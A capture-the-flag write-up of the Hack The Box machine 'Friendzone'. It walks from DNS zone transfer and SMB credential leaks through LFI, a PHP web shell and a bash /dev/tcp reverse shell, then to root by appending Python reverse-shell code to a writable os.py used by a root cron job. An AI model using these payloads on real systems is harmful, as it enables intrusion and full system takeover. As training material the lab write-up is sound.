---
layout: single
title: Friendzone - Hack The Box
excerpt: "Friendzone is an easy difficuly Linux machine. which needs fair amount of enumerations. Intial foothold invovles doing a DNS zone transfer and discover vhosts. Open shares are available through smb which provides credential for admin page. LFI in dashboard.php is leveraged to get RCE. A cron job is running using writable module, making it vulnerable to hijacking."
date: 2020-04-17
classes: wide
header:
  teaser: /assets/images/htb-writeup-friendzone/friendzone_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - OSCP
  - LFI
  - RCE
  - DNS
  - cron
---

![](/assets/images/htb-writeup-friendzone/friendzone_logo.png)

## Synopsis
Friendzone is an easy difficuly Linux machine. which needs fair amount of enumerations. Intial foothold invovles doing a DNS `zone transfer` and discover `vhosts`. Open shares are available through `smb` which provides `credential` for `admin` page. `LFI` in `dashboard.php` is leveraged to get `RCE`. A `cron` job is running using `writable module`, making it vulnerable to `hijacking`.

## Skills Required
* Enumeration
* DNS zone transfer

## Skills Learned
* Module Hijacking

---
## Enumeration
### Nmap
```java
# Nmap 7.80 scan initiated Thu Apr 16 20:35:42 2020 as: nmap -Pn -sC -sV -v -p21,22,53,80,139,443,445 -oN full.nmap friendzone.htb
Nmap scan report for friendzone.htb (10.10.10.123)
Host is up (0.17s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/ssl     Apache httpd (SSL-only mode)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Issuer: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-10-05T21:02:30
| Not valid after:  2018-11-04T21:02:30
| MD5:   c144 1868 5e8b 468d fc7d 888b 1123 781c
|_SHA-1: 88d2 e8ee 1c2c dbd3 ea55 2e5e cdd4 e94c 4c8b 9233
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: FRIENDZONE; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -58m39s, deviation: 1h43m54s, median: 1m19s
| nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   FRIENDZONE<00>       Flags: <unique><active>
|   FRIENDZONE<03>       Flags: <unique><active>
|   FRIENDZONE<20>       Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2020-04-16T18:07:18+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-16T15:07:18
|_  start_date: N/A
```
We see services running on their default ports. `FTP` is open but no `anonymous` login. we've `DNS` open but its `TCP`. `HTTPS` Certificate shows `commonName=friendzone.red`.

### HTTP
Browsing through the page on `HTTP` give us a page with image. Which discloses another `vhost` `friendzoneportal.red`.

![](/assets/images/htb-writeup-friendzone/portal.png)

### DNS
As we've a know `vhosts` already. let's try `dns` zone transfers. we'll use `dig`
```
dig axfr friendzone.red @10.10.10.123 -p53

; <<>> DiG 9.11.16-2-Debian <<>> axfr friendzone.red @10.10.10.123 -p53
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 187 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Fri Apr 17 23:53:19 IST 2020
;; XFR size: 8 records (messages 1, bytes 289)
```
```
dig axfr friendzoneportal.red @10.10.10.123 -p53

; <<>> DiG 9.11.16-2-Debian <<>> axfr friendzoneportal.red @10.10.10.123 -p53
;; global options: +cmd
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.   604800  IN      AAAA    ::1
friendzoneportal.red.   604800  IN      NS      localhost.
friendzoneportal.red.   604800  IN      A       127.0.0.1
admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
files.friendzoneportal.red. 604800 IN   A       127.0.0.1
imports.friendzoneportal.red. 604800 IN A       127.0.0.1
vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 187 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Sat Apr 18 00:31:42 IST 2020
;; XFR size: 9 records (messages 1, bytes 309)
```

The results contains multiple new sub domains administrator1,hr,uploads,admin,files,imports,vpn . We'll add all of these to our `hosts` file.

### SAMBA
we'll enumerate `smb` shares using `enum4linux`. IT discovers Files,general(R),Development(RW) shares.
```
enum4linux 10.10.10.123

<SNIP>
========================================= 
|    Share Enumeration on 10.10.10.123    |
 ========================================= 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	Files           Disk      FriendZone Samba Server Files /etc/Files
	general         Disk      FriendZone Samba Server Files
	Development     Disk      FriendZone Samba Server Files
	IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.10.123
//10.10.10.123/print$	Mapping: DENIED, Listing: N/A
//10.10.10.123/Files	Mapping: DENIED, Listing: N/A
//10.10.10.123/general	Mapping: OK, Listing: OK
//10.10.10.123/Development	Mapping: OK, Listing: OK
//10.10.10.123/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
<SNIP>
```

Comments of `Files` share is defined as `/etc/Files` as its location. So, we may assume `general` and `Development` shares follows the same. 

Let's connect to `shares` to view the contents.
```
smbclient //10.10.10.123/general

Enter WORKGROUP\mah1ndra's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jan 17 01:40:51 2019
  ..                                  D        0  Thu Jan 24 03:21:02 2019
  creds.txt                           N       57  Wed Oct 10 05:22:42 2018

                9221460 blocks of size 1024. 6460372 blocks available
smb: \> get creds.txt
getting file \creds.txt of size 57 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

$cat creds.txt 

creds for the admin THING:
admin:WORKWORKHhallelujah@#
```
Found a `creds.txt` file which gives us the admin creds `admin:WORKWORKHhallelujah@#` which we can try on different logins available.

Next, Connecting to `Development` share it appears to be empty. However, we can upload files to the share.
```
smbclient -N //10.10.10.123/Development
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jan 17 01:33:49 2019
  ..                                  D        0  Thu Jan 24 03:21:02 2019

                9221460 blocks of size 1024. 6460372 blocks available
smb: \> put test.txt
putting file test.txt as \test.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \> ls
  .                                   D        0  Sat Apr 18 00:53:39 2020
  ..                                  D        0  Thu Jan 24 03:21:02 2019
  test.txt                            A        0  Sat Apr 18 00:53:39 2020

                9221460 blocks of size 1024. 6460372 blocks available
```

we get access denied while trying to access `Files` share.
```
smbclient -N //10.10.10.123/Files
tree connect failed: NT_STATUS_ACCESS_DENIED
```

### HTTPS
Navigating to the page and after accepting the certificate. we land on a page with a gif.

![](/assets/images/htb-writeup-friendzone/https.png)

Now, let's enumerate the `vhosts` which we discovered earlier.

Navigating to `https://administrator1.friendzone.red` we find a login page. 

![](/assets/images/htb-writeup-friendzone/admin1.png)

Looking at it's source we can observe it's sending post request to a `login.php`. So this is most probably an application built using php.

We'll run a quick gobuster with `php` as extenstion.
```
gobuster dir -u https://administrator1.friendzone.red/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -x php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://administrator1.friendzone.red/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/04/18 01:07:28 Starting gobuster
===============================================================
/images (Status: 301)
/login.php (Status: 200)
/dashboard.php (Status: 200)
/timestamp.php (Status: 200)
```

we found `/images` directory and `login,dashboard,timestamp` php files. let's have a look at them .Using Credentials we found on `smb` `general` share on `login.php` helps us to successfully login and asks us to visit `dasboard.php`.

![](/assets/images/htb-writeup-friendzone/redirect.png)

visiting `timestamp.php` displays us the current timestamp.

![](/assets/images/htb-writeup-friendzone/time.png)

Going to `dashboard.php` display us some information.

![](/assets/images/htb-writeup-friendzone/info.png)


## Exploiting LFI
The page tell us to use `image_id` and `pagename` parameters on the current page. Let's try as the page say `image_id=a.jpg&pagename=timestamp`.

![](/assets/images/htb-writeup-friendzone/troll.png)

We are displayed with an image and `timestamp` output similar to `timestamp.php` page we found earlier. So, the page might be including `timestamp.php` and executing it.

Let's try to include other `php` files like `login.php`.

![](/assets/images/htb-writeup-friendzone/wrong.png)

we see `Wrong!` as the output which the login page returns in case of a failed login. So, we confirmed that `timestamp` parameter is Vulnerable to `Local File Inclusion` . We can leverage this to gain `RCE` on the machine.

we can use `php wrapper` to get the php code on the sever inthe from of base64. using `pagename=php://filter/convert.base64-encode/resource=login`. With this we can see long base64 on the page.

![](/assets/images/htb-writeup-friendzone/base.png)

We can decode and see the source code .
```php
echo -n PD9waHAKCgokdXNlcm5hbWUgPSAkX1BPU1RbInVzZXJuYW1lIl07CiRwYXNzd29yZCA9ICRfUE9TVFsicGFzc3dvcmQiXTsKCi8vZWNobyAkdXNlcm5hbWUgPT09ICJhZG1pbiI7Ci8vZWNobyBzdHJjbXAoJHVzZXJuYW1lLCJhZG1pbiIpOwoKaWYgKCR1c2VybmFtZT09PSJhZG1pbiIgYW5kICRwYXNzd29yZD09PSJXT1JLV09SS0hoYWxsZWx1amFoQCMiKXsKCnNldGNvb2tpZSgiRnJpZW5kWm9uZUF1dGgiLCAiZTc3NDlkMGY0YjRkYTVkMDNlNmU5MTk2ZmQxZDE4ZjEiLCB0aW1lKCkgKyAoODY0MDAgKiAzMCkpOyAvLyA4NjQwMCA9IDEgZGF5CgplY2hvICJMb2dpbiBEb25lICEgdmlzaXQgL2Rhc2hib2FyZC5waHAiOwp9ZWxzZXsKZWNobyAiV3JvbmcgISI7Cn0KCgoKPz4K | base64 -d 

<?php
$username = $_POST["username"];
$password = $_POST["password"];

//echo $username === "admin";
//echo strcmp($username,"admin");

if ($username==="admin" and $password==="WORKWORKHhallelujah@#"){

setcookie("FriendZoneAuth", "e7749d0f4b4da5d03e6e9196fd1d18f1", time() + (86400 * 30)); // 86400 = 1 day

echo "Login Done ! visit /dashboard.php";
}else{
echo "Wrong !";
}
?>
```


## FootHold
From the earlier enumeration we know that the `Development` share is writable and in the comments we read the path for `Files` share is `/etc/Files` and we assume `/etc/Development` location for `Development` share.

We'll upload a simple `php` shell on to the share with `smbclient`.
```php
cat pwn.php

<?php system($_GET['cmd']);?>
```
```
smbclient -N //10.10.10.123/Development

Try "help" to get a list of possible commands.
smb: \> put pwn.php
putting file pwn.php as \pwn.php (0.1 kb/s) (average 0.1 kb/s)
```

Making following request give us the `id` of the user the sever is running as.
```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/pwn&cmd=id
```
![](/assets/images/htb-writeup-friendzone/id.png)

Now, to get a reverse shell we'll do the following request with simple bash commands.
```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/pwn&cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.24/443+0>%261"
```

This gives us a reverse shell as `www-data` user.
```
sudo ncat -lvnp 443


Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.123.
Ncat: Connection from 10.10.10.123:40844.
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 23:19:38 up  1:27,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
www-data@FriendZone:/$ whoami && hostname
www-data
FriendZone
```
We found `mysql_data.conf` file at `/var/www` which contains the DB credentials of the `friend` user.
```
www-data@FriendZone:/var/www$ cat mysql_data.conf 
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```

We can either `ssh` or `su` as friend user on the box using this credentials `friend:Agpyu12!0.213$`.


## Privilege Escalation
We'll use [pspy](https://github.com/DominicBreuker/pspy) to enumerate running `cron` jobs and `processess`. we'll download it and upload it on to the machine and execute it.
```
friend@FriendZone:/dev/shm$ wget http://10.10.14.24/pspy64
friend@FriendZone:/dev/shm$ chmod +x pspy64 
```
After a while we find a script running as root
```go
2020/04/17 23:44:01 CMD: UID=0    PID=10266  | /usr/bin/python /opt/server_admin/reporter.py 
2020/04/17 23:44:01 CMD: UID=0    PID=10265  | /bin/sh -c /opt/server_admin/reporter.py 
2020/04/17 23:44:01 CMD: UID=0    PID=10264  | /usr/sbin/CRON -f
```
looking at the `reporter.py`.
```python
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```
Going throught the script there is nothing unusal about the script and everything is commented out. So, it doesn't seems to be exploitable.

### Module Hijacking
So, we'll run `linpeas` to enumerate furthur. while running ti found some world writable files.
```
[+] Interesting writable files owned by me or writable by everyone (not in Home)                                           
                                           
/dev/mqueue                                                                                                                
/dev/mqueue/linpeas.txt                                                                                                    
/usr/lib/python2.7                                                                                                         
/usr/lib/python2.7/os.py                                                                                                   
/usr/lib/python2.7/os.pyc                                                                                                  
/var/lib/php/sessions                                                                                                      
/var/mail/friend  
```
We can see `os.py` is `writable` by `anyone` which the `reporter.py` script from the `crontab` import the scripts. So, we can write code to `os.py` and we an `hijack` it's execution. This is known as `Module Hijacking`.

Let's append our revershell code to `os.py` at `/usr/lib/python2.7` and After a while the Hijacked `os` module is imported by script running by root and we'll get a reverse shell.
```python
                     _make_statvfs_result)
except NameError: # statvfs_result may not exist
    pass

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.24",443));
dup2(s.fileno(),0); 
dup2(s.fileno(),1); 
dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

And we get a reverse shell as `root`.
```
sudo ncat -lvnp 443         
                                                                              
Ncat: Listening on :::443                                                                                                  
Ncat: Listening on 0.0.0.0:443                                                                                             
Ncat: Connection from 10.10.10.123.                                                                                        
Ncat: Connection from 10.10.10.123:41658.                                                                                  
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
FriendZone
# ls 
certs
root.txt
```
Thank you for taking you're time for reading this blog!.